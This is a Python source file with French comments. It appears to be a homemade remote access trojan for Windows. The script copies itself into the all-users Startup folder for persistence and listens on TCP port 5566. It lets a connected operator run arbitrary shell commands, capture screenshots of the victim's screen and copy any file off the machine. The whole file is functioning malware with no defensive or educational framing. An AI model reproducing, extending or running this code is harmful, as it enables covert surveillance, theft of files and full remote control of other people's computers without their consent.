import socket
import sys
from shutil import copy as cop
from os.path import exists as ex
from os import system
from pyautogui import screenshot
from webbrowser import open as op
from os import listdir,getcwd
########################################################################################
#######################################################################################
a=sys.argv[0] #chemin du fichier courant
def decoupage(chemin):
    list=chemin.split('\\')
    n=len(list)-1
    
    return list[n]
################################## gestion du demarrage #################################  
if not ex("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+decoupage(a)):
    filePath = cop(a, 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup')


import math
import time, socket, os
def extract(text):
    resultat= text.split(maxsplit=1)
    if len(resultat)>=2: 
        return resultat[1]
    else:
        return "" #retoune le dexieme partie de la chaine en parametre hors mis le mot clé
def firstWord(text):
    resultat= text.split(" ")
    return resultat[0] #retourne le premier mot de la chaine en parametre 
    ################################################### envoie de fichier #############################################

def envoie(nomFich):

    ##################################################################
    # PARTIE ENVOIE DU FICHIER
    ##################################################################
    if nomFich != "":
        try:
            fich = open(nomFich, "rb") # test si le fichier existe
            fich.close()
        except:
            print (" >> le fichier '" + nomFich + "' est introuvable.")
            time.sleep(2)
            exit()

        octets = os.path.getsize(nomFich) / 1024
        print (" >> OK : '" + nomFich + "' [" + str(octets) + " Ko]")      
        print (" >> Vous etes connecte au serveur, patientez d'une reponse...")
        msg=("NAME " + nomFich + "OCTETS " + str(octets))# Envoi du nom et de la taille du fichier  
        conn.send(msg.encode("utf8"))
        # Boucle temps que l'ont est connecte
        ############################################
        sendd=False
        while (sendd==False):

            recu = conn.recv(8000)
            
            recu=recu.decode("utf8")
            if not recu : break

            if recu == "GO": # Si le serveur accepte on envoi le fichier
                print (" >> Le serveur accepte le transfert")
                print(" >> [%H:%M] transfert en cours veuillez patienter...")

                num = 0
                pourcent = 0
                
                octetss = octets * 1024 # Reconverti en octets
                fich = open(nomFich, "rb")

                if octetss > 8000:	# Si le fichier est plus lourd que 8000 on l'envoi par paquet
                    octets=math.floor(octets)
                    octets=int(octets)
                    octets=octets*1024
                    for i in range(int(octets / 8000)+1):        
                    
                            fich.seek(num, 0) # on se deplace par rapport au numero de caractere (de 8000 a 8000 octets)
                            donnees = fich.read(8000) # Lecture du fichier en 8000 octets                            
                            conn.send(donnees) # Envoi du fichier par paquet de 8000 octets
                            num = num + 8000
                    
                            # Condition pour afficher le % du transfert (pas trouve mieu) :
                            if pourcent == 0 and num > octets / 100 * 10 and num < octets / 100 * 20:
                                print (" >> 10%")
                                pourcent = 1
                            elif pourcent == 1 and num > octets / 100 * 20 and num < octets / 100 * 30:
                                print (" >> 20%")
                                pourcent = 2
                            elif pourcent < 3 and num > octets / 100 * 30 and num < octets / 100 * 40:
                                print (" >> 30%")
                                pourcent = 3
                            elif pourcent < 4 and num > octets / 100 * 40 and num < octets / 100 * 50:
                                print (" >> 40%")
                                pourcent = 4
                            elif pourcent < 5 and num > octets / 100 * 50 and num < octets / 100 * 60:
                                print (" >> 50%")
                                pourcent = 5
                            elif pourcent < 6 and num > octets / 100 * 60 and num < octets / 100 * 70:
                                print (" >> 60%")
                                pourcent = 6
                            elif pourcent < 7 and num > octets / 100 * 70 and num < octets / 100 * 80:
                                print (" >> 70%")
                                pourcent = 7
                            elif pourcent < 8 and num > octets / 100 * 80 and num < octets / 100 * 90:
                                print (" >> 80%")
                                pourcent = 8
                            elif pourcent < 9 and num > octets / 100 * 90 and num < octets / 100 * 100:
                                print (" >> 90%")                    
                                pourcent = 9

                else: # Sinon on envoi tous d'un coup
                    donnees = fich.read()
                    conn.send(donnees)

                fich.close()
                
                print (" >> transfert termine !")
            sendd=True
            print("looooooooooooooooooooooooooooooooooooooooooooooooooooooooool")    
    conn.send("BYE".encode("utf-8"))            
    # Envoi comme quoi le transfert est fini    



###############################################################################################
##############################################################################################

def capture():
    screen=screenshot()
    screen.save("screen.jpg")
    print("capture effectuée !!! ")
sockets=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host,port = socket.gethostbyname(socket.gethostname()),5566
print(host)
connected=False
while True:
    try:
        sockets.bind((host,port))
        while connected==False:
            sockets.listen(5)
            conn,adress=sockets.accept()
            connected=True
        while True:
            print("en ecoute...")
            err='False'
            command=conn.recv(1024)
            command=command.decode("utf8")
            print(firstWord(command))
            if command=="capture":
                capture()
                envoie("screen.jpg")
            elif firstWord(command)=="copie":
                command=extract(command) 
                print(command)
                envoie(command)
            elif command=='voir' or command=='liste':
                err='info'                    
            else:
                try:
                    print(command)
                    system(command)
                except:
                    err='True'
            if err=='True':
                errMsg=" erreur l'ors de l'execution de la comande verifiez que celle ci est correcte !"
                errMsg=errMsg.encode("utf-8")
                conn.sendall(errMsg)
            elif err=='info':
                errMsg=str(listdir(getcwd()))
                errMsg=errMsg.encode("utf-8")
                conn.sendall(errMsg)     
            else:
                errMsg="commande effectuée avec SUCCES !!! " 
                errMsg=errMsg.encode("utf-8")
                conn.send(errMsg)   
    except:
        pass                                
    

    
    